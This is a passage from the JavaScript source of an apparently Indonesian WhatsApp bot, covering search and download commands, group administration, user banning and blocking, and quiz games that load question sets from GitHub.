            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(lang.KisahNabi(prefix, command, 'naruto'))
                await reply(lang.wait())
                zee.Character(q).then(async data => {
                    let txt = `*---「 CHARACTER-SEARCH 」---*\n\n`
                    for (let i of data) {
                        txt += `*📫 Character :* ${i.character}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    let gam = await getBuffer(data[0].thumbnail.replace('https://www.anime-planet.com',''))
                    var but = [
				{
					"urlButton": {
						"displayText": "Website",
						"url": `${myweb}`
						}
					}
				]
				await alpha.sendButLoc(m.chat,  txt, '©' + ownername, gam, [
{buttonId: `.menu` , buttonText: {displayText: 'Menu'}, type: 1}
], {userJid: m.chat, quoted: m})
			 })
                .catch((err) => {
                    reply(lang.serverErr)
                })
                db.data.users[m.sender].limit -= 1
                }
            break
            case 'manga':
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(lang.KisahNabi(prefix, command, 'naruto'))
                await reply(lang.wait())
                zee.Manga(`${text}`).then(async data => {
                    let txt = `*------「 MANGA-SEARCH 」------*\n\n`
                    for (let i of data) {
                         txt += `*📫 Title :* ${i.judul}\n`
                         txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    let gam = await getBuffer(data[0].thumbnail.replace('https://www.anime-planet.com',''))
                    var but = [
				{
					"urlButton": {
						"displayText": "Website",
						"url": `${myweb}`
						}
					}
				]
				await alpha.sendButLoc(m.chat,  txt, '©' + ownername, gam, [
{buttonId: `.menu` , buttonText: {displayText: 'Menu'}, type: 1}
], {userJid: m.chat, quoted: m})
			  })
                .catch((err) => {
                    reply(lang.serverErr)
                })
				db.data.users[m.sender].limit -= 1
            break
            case 'soundcloud':{
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
    	        if (!text) return reply(lang.KisahNabi(prefix, command, 'Url SoundCloud'))
                if (!isUrl(q)) return reply(lang.KisahNabi(prefix, command, 'Url SoundCloud'))
                if (!text.includes('soundcloud.com')) return reply(lang.KisahNabi(prefix, command, 'Url SoundCloud'))
                await reply(lang.wait())
				zee.SoundCloud(`${text}`).then(async (data) => {
                    let txt = `*----「 SOUNDCLOUD DOWNLOAD 」----*\n\n`
                    txt += `*📟 Title :* ${data.title}\n`
                    txt += `*🎞️ Duration :* ${data.duration}\n`
					txt += `*🛠️ Quality :* ${data.medias[1].quality}\n`
					txt += `*🚧 Ext :* ${data.medias[0].extension}\n`
                    txt += `*💾 Size :* ${data.medias[0].formattedSize}\n`
                    txt += `*📚 Url Source :* ${data.url}\n\n`
                    txt += `*Mohon tunggu sebentar kak, sedang proses pengiriman...*`
                    let gam = await getBuffer(data.thumbnail)
				await alpha.sendButLoc(m.chat,  txt, '©' + ownername, gam, [
{buttonId: `.menu` , buttonText: {displayText: 'Menu'}, type: 1}
], {userJid: m.chat, quoted: m})
			  })
                    alpha.sendMessage(from, {audio : {url : data.medias[0].url}, fileName: `${data.title}.mp3`, mimetype: 'audio/mpeg'}, {quoted: m})
                    }
                    db.data.users[m.sender].limit -= 1
                    break
              
            case 'twtdl': case 'twt': case 'twitterdl': case 'twitter':
            if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(lang.KisahNabi(prefix, command, 'url Twitter'))
                if (!isUrl(q)) return reply(lang.KisahNabi(prefix, command, 'url Twitter'))
                if (!text.includes('twitter.com')) return reply(lang.KisahNabi(prefix, command, 'url Twitter'))
                await reply(lang.wait())
                zee.Twitter(`${q}`).then(async data => {
                    let txt = `*----「 TWITTER DOWNLOADER 」----*\n\n`
                    txt += `*📫 Title :* ${data.title}\n`
                    txt += `*📟 Quality :* ${data.medias[1].quality}\n`
                    txt += `*💾 Size :* ${data.medias[1].formattedSize}\n`
                    txt += `*📚 Url :* ${data.url}`
                    sendFileFromUrl(from,data.medias[1].url,txt,m)
                })
                .catch((err) => {
                    reply(lang.serverErr)
                })
				db.data.users[m.sender].limit -= 1
            break
            case 'infochat': case 'sider': {
                if (!m.quoted) return reply(lang.LockCmd())
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) return reply(lang.NoMsgBot())
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                alpha.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return reply(lang.LockCmd())
		let wokwol = await alpha.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return reply(lang.NoQouted())
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listchat': case 'listpc': {
            	if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 alpha.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'liston': case 'listonline':{
             	if (!isGroupAdmins && !isGroupOwner) return reply(lang.adminOnly())
             	   let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    alpha.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
                    }
                    break
                 case 'olistgc': {
if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
let getGroups = await alpha.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata = await alpha.groupMetadata(i)
teks += `🐥 *Nama :* ${metadata.subject}\n👤 *Owner :* @${groupMetadata.owner.split('@')[0]}\n♨️ *ID :* ${metadata.id}\n🗓️ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n👥 *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
}
alpha.sendTextWithMentions(m.chat, teks, m)
}
break
               case 'listgroup': case 'listgc': {
                	if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
					let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await alpha.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : '-'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 alpha.sendTextWithMentions(m.chat, teks, m)
            }
                 break
             case 'setname': case 'setsubject': {
                if (!m.isGroup) return reply(lang.groupOnly())
				if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
				if (!isBotAdmins) return reply(lang.botNotAdmin())
				if (!text) return reply(lang.SetGcName(prefix, command))
                await alpha.groupUpdateSubject(m.chat, text).then((res) => m.reply(lang.ok())).catch((err) => m.reply(jsonformat(err)))
            }
            break
             case 'setdesc': case 'setdesk': case 'setdeskripsi':{
             	if (!m.isGroup) return reply(lang.groupOnly())
				if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
				if (!isBotAdmins) return reply(lang.botNotAdmin())
				if (!text) return reply(lang.SetGcName(prefix, command))
				alpha.groupUpdateDescription(m.chat, `${args.join(" ")}`)
				reply(lang.ok())
				}
				break
            
            case 'join': {
                if (!isCreator) return reply(lang.ownerOnly())
                if (!text) return reply(lang.JoinGc())
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
                reply(lang.wait())
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await alpha.groupAcceptInvite(result).then((res) => m.reply(lang.ok())).catch((err) => m.reply(lang.err()))
            }
            break
            case 'tagall': case 'infoall':
                if (!m.isGroup) return reply(lang.groupOnly())
                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
                let tekss = `══✪〘 *👥 Mention All* 〙✪══\n\n➲ *Message : ${q ? q : 'Nothing'}*\n\n`
		      	for (let mem of participants) {
		            tekss += `🏅 @${mem.id.split('@')[0]}\n`
				}
                tekss += `\n⋙ *${botname}* ⋘`
                alpha.sendMessage(from, { text: tekss, mentions: participants.map(a => a.id) }, { quoted: fkontak })
            break
            case 'hidetag':
                if (!m.isGroup) return reply(lang.groupOnly())
                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
                alpha.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted: fkontak})
            break
			case 'banuser': case 'banned': {
				if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
                if (!m.quoted && !text) return reply(lang.NoTagBan(prefix, command))
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				if (typeof db.data.users[users] == 'undefined') m.reply('Pengguna tidak ada didalam data base')
				let banUser = db.data.users[users]
				banUser.banned = true
				banUser.BannedReason = text.split('|')[1] ? text.split('|')[1] : "I don't know"
				reply(lang.ok())
				}
				break
			case 'unbanuser': case 'unban': case 'unbanned': {
				if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
                if (!m.quoted && !text) return reply(lang.NoTagBan(prefix, command))
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				let banUser = db.data.users[users]
				banUser.banned = false
				reply(lang.ok())
				}
				break
			case 'block': {
		if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
                if (!m.quoted && !text) return reply(lang.NoTagBan(prefix, command))
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alpha.updateBlockStatus(users, 'block').then((res) => m.reply(lang.ok())).catch((err) => m.reply(lang.err()))
	}
	break
        case 'unblock': {
		if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
                if (!m.quoted && !text) return reply(lang.NoTagBan(prefix, command))
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alpha.updateBlockStatus(users, 'unblock').then((res) => m.reply(lang.ok())).catch((err) => m.reply(lang.err()))
	}
	break
            case 'kick': {
				if (!m.isGroup) return reply(lang.groupOnly())
                if (!isBotAdmins) return reply(lang.botNotAdmin())
                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
                if (!m.quoted && !text) return reply(lang.MauKick())
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				await alpha.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(lang.ok())).catch((err) => m.reply(lang.err()))
				}
				break
			case 'add': {
				if (!m.isGroup) return reply(lang.groupOnly())
                if (!isBotAdmins) return reply(lang.botNotAdmin())
                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
                if (!m.quoted && !text) return reply(lang.MauAdd())
				let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				await alpha.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(lang.ok())).catch((err) => m.reply(lang.err()))
				}
				break
			case 'promote': {
				if (!m.isGroup) return reply(lang.groupOnly())
                if (!isBotAdmins) return reply(lang.botNotAdmin())
                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())	
                if (!m.quoted && !text) return reply(lang.NakPm())
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				await alpha.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(lang.ok())).catch((err) => m.reply(lang.err()))
				}
				break
			case 'demote': {
				if (!m.isGroup) return reply(lang.groupOnly())
                if (!isBotAdmins) return reply(lang.botNotAdmin())
                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
                if (!m.quoted && !text) return reply(lang.NakDm())
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				await alpha.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(lang.ok())).catch((err) => m.reply(lang.err()))
				}
				break
			case 'revoke':
                if (!m.isGroup) return reply(lang.groupOnly())
                if (!isBotAdmins) return reply(lang.botNotAdmin())
                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
                let link = await alpha.groupRevokeInvite(from)
                await reply(lang.ok() + `\n\n*New Link for ${groupName}* :\n https://chat.whatsapp.com/${link}`)
            break
            case 'out':
                if (!m.isGroup) return reply(lang.groupOnly())
                if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
               reply('Bye 👋').then(async res => await alpha.groupLeave(m.chat))
            break
            case 'group': case 'grup':
                if (!m.isGroup) return reply(lang.groupOnly())
                if (!isBotAdmins) return reply(lang.botNotAdmin())
                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
                if (args[0] === 'open'){
                    await alpha.groupSettingUpdate(from, 'not_announcement')
		 		   reply(lang.ok())
                } else if (args[0] === 'close'){
                    await alpha.groupSettingUpdate(from, 'announcement')
                    reply(lang.ok())
                } else {
                    alpha.sendButMessage(from, 'GROUP SETTING', `© ${ownername}`, [{buttonId: '.group open', buttonText: {displayText: 'Open'}, type: 1},{buttonId: '.group close', buttonText: {displayText: 'Close'}, type: 1}], {quoted: fgif})
                }
            break 
			case 'afk': {
if (!m.isGroup) return reply(lang.groupOnly())
let user = db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(lang.TbAfk(pushname, text))
}
break  
case 'family100': {
	reply('Maintenance')
/*if ('family100'+m.chat in _family100) {
reply(lang.Family())
throw false
}
let anu = await fetchJson('https://fatiharridho.my.id/database/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `${lang.TbFamily(random.soal, random.jawaban.length, random.jawaban.find)}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
 pesan: await alpha.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}*/
}
break
case 'tebakgambar': {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendMedia(m.chat, result.img, '', m, { caption: lang.TbGambar(result.deskripsi, '60s') }).then(() => {
console.log("Jawaban: " + result.jawaban)
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.tebakgambar', buttonText: { displayText: lang.TbGam() }, type: 1 }], lang.TbGambar_(result.jawaban) , `© ${ownername}`, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} 
break
case 'tebakkata': {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendText(m.chat, lang.TbKata(result.soal, '60s'), m).then(() => {
console.log("Jawaban: " + result.jawaban)
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.tebakkata', buttonText: { displayText: lang.TbKa() }, type: 1 }], lang.TbGambar_(result.jawaban) , `© ${ownername}`, m)
delete tebakkata[m.sender.split('@')[0]]
}
}
break 
case 'tebakbendera': {
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendMedia(m.chat, result.img, '', m, { caption: lang.TbBendera('60s') }).then(() => {
console.log("Jawaban: " + result.name)
tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.tebakbendera', buttonText: { displayText: lang.TbBe()}, type: 1 }], lang.TbGambar_(result.name), `© ${ownername}`, m)
delete tebakbendera[m.sender.split('@')[0]]
}
} 
break
case 'tebakkalimat': {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendText(m.chat, lang.TbKata(result.soal, '60s'), m).then(() => {
console.log("Jawaban: " + result.jawaban)
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.tebakkalimat', buttonText: { displayText: lang.TbAt() }, type: 1 }], lang.TbGambar_(result.jawaban) , `© ${ownername}`, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} 
break
case 'tebaksiapa': {
if (siapaaku.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendText(m.chat, lang.TbKata(result.soal, '60s'), m).then(() => {
console.log("Jawaban: " + result.jawaban)
siapaaku[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (siapaaku.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.tebaksiapa', buttonText: { displayText: lang.TbSi()}, type: 1 }], lang.TbGambar_(result.jawaban) , `© ${ownername}`, m)
delete siapaaku[m.sender.split('@')[0]]
}
} 
break
case 'tebakkabupaten':{
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendImage(m.chat, result.url, lang.TbKabupaten('60s'), m).then(() => {
console.log("Jawaban: " + result.title)
tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
})
await sleep(60000)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.tebakkabupaten', buttonText: { displayText: lang.TbEn() }, type: 1 }], lang.TbGambar_(result.title) , `© ${ownername}`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
}
}
break
 case 'tebakkimia':{
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendText(m.chat, lang.TbKimia(result.lambang, '60s'), m).then(() => {
console.log("Jawaban: " + result.unsur)
tebakkimia[m.sender.split('@')[0]] = result.unsur.toLowerCase()
})
await sleep(60000)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.tebakkimia', buttonText: { displayText: lang.TbKi()}, type: 1 }], lang.TbGambar_(result.unsur), `© ${ownername}`, m)
delete tebakkimia[m.sender.split('@')[0]]
}
} 
break
case 'tebaklirik': {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendText(m.chat, lang.TbLirik(result.soa, '60s'), m).then(() => {
alpha.sendButtonText(m.chat, [{ buttonId: '.tebaklirik', buttonText: { displayText: lang.TbLi()}, type: 1 }], lang.TbGambar_(result.jawaban) , `© ${ownername}`, m)
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
reply(lang.TbGambar_(result.jawaban))
delete tebaklirik[m.sender.split('@')[0]]
}
}
break
case 'tebaktebakan': {
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendText(m.chat, lang.TbKata(result.soal, '60s'), m).then(() => {
console.log("Jawaban: " + result.jawaban)
tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.tebak tebakan', buttonText: { displayText: lang.TbKan() }, type: 1 }], lang.TbGambar_(result.jawaban) , `© ${ownername}`, m)
delete tebaktebakan[m.sender.split('@')[0]]
}
}
break
case 'caklontong': {
	reply('Maintenance')/*
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://fatiharridho.my.id/database/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendText(m.chat, lang.TbKata(result.soal, '60s'), m).then(() => {
console.log("Jawaban: " + result.jawaban)


caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.caklontong', buttonText: { displayText: lang.TbCak() }, type: 1 }], lang.TbGambar__(result.jawaban, result.deskripsi) , `© ${ownername}`, m)
delete caklontong[m.sender.split('@')[0]]
}*/
}
break
case 'susunkata': {
if (susunkata.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendText(m.chat, lang.TbSusun(result.soal, result.tipe, '60s'), m).then(() => {
console.log("Jawaban: " + result.jawaban)
susunkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (susunkata.hasOwnProperty(m.sender.split('@')[0])) {
alpha.sendButtonText(m.chat, [{ buttonId: '.susunkata', buttonText: { displayText: lang.TbSu() }, type: 1 }], lang.TbGambar_(result.jawaban) , `© ${ownername}`, m)
delete susunkata[m.sender.split('@')[0]]
}
}
break
case 'kuismath': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let { genMath, modes } = require('./lib/math')
if (!text) return reply(lang.TbMath(Object.keys(modes).join(' | '), prefix, command))
let result = await genMath(text.toLowerCase())
alpha.sendText(m.chat, lang.TbMath_(result.soal.toLowerCase(), (result.waktu / 1000).toFixed(2)), m).then(() => {
console.log("Jawaban: " + result.jawaban)
kuismath[m.sender.split('@')[0]] = [result.jawaban, result.hadiah]
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
reply(lang.TbGambar_(result.jawaban))
delete kuismath[m.sender.split('@')[0]]
}
}
break
case 'tekateki': {
if (tekateki.hasOwnProperty(m.sender.split('@')[0])) return reply(lang.Family())
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
let result = anu[Math.floor(Math.random() * anu.length)]
alpha.sendText(m.chat, lang.TbKata(result.soal, '60s'), m).then(() => {
console.log("Jawaban: " + result.jawaban)
tekateki[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tekateki.hasOwnProperty(m.sender.split('@')[0])) {
	alpha.sendButtonText(m.chat, [{ buttonId: '.tekateki', buttonText: { displayText: lang.Tbte()}, type: 1 }], lang.TbGambar_(result.jawaban) , `© ${ownername}`, m)
delete tekateki[m.sender.split('@')[0]]
}
}
break
            case 'setmenu':{
            	if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
            const listhades = ['templateLocation', 'templateTenor','list', 'document',  'katalog', 'katalog2']
			if (!listhades.includes(text)) {
			 alpha.sendList(from, lang.SetAh(), `© ${ownername}`, salam + ' ' + pushname, 'Click Here', [
							{"title": "Set Menu-1","rows": [{"title": "Template Button Location","rowId": ".setmenu templateLocation"}]},{"title": "Set Menu-2","rows": [{"title": "Template Button Tenor","rowId": ".setmenu templateTenor"}]},{"title": "Set Menu-3","rows": [{"title": "Menu Katalog","rowId": ".setmenu katalog"}]},{"title": "Set Menu-4","rows": [{"title": "Menu Katalog Diskon","rowId": ".setmenu katalog2"}]},{"title": "Set Menu-5","rows": [{"title": "Menu List Message","rowId": ".setmenu list"}]
							},{
								"title": "Set Menu-6",
								"rows": [
									{
										"title": "Menu Document",
										"rowId": ".setmenu document"
									}
								]
							}], {quoted:fgif})
							} else {
                	typemenu = text
		 		   reply(lang.ok())
		}
		}
            break
				case 'help': case 'panel': case 'menu':{
					try{
			hit_total = await fetchJson('https://api.countapi.xyz/hit/api-alphabot.herokuapp.com/visits')
			} catch {
				hit_total = { 
					value : "-"
					}
				}
				hitall = `${hit_total.value == undefined ? '-' : hit_total.value}`
				let bio = (await alpha.fetchStatus(m.sender).catch(console.error) || {}).status || '-'
				let { exp, limit, level, money, role } = global.db.data.users[m.sender]
				let goblock = await alpha.fetchBlocklist()
				let { min, xp, max } = levelling.xpRange(level, global.multiplier)
				let dnew = new Date(new Date + 3600000)
				let user = db.data.users[m.sender]
				let week = dnew.toLocaleDateString('en', { weekday: 'long' })
			    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(dnew / 84600000) % 5]
			    let date = dnew.toLocaleDateString('en', {
			      day: 'numeric',
			      month: 'long',
			      year: 'numeric'
			    })
			    let dateIslamic = Intl.DateTimeFormat('en' + '-TN-u-ca-islamic', {
			      day: 'numeric',
			      month: 'long',
			      year: 'numeric'
			    }).format(dnew)
				
				let ownernya = ownernomer + '@s.whatsapp.net'
				var ini_anu =`Hi ${user.name}

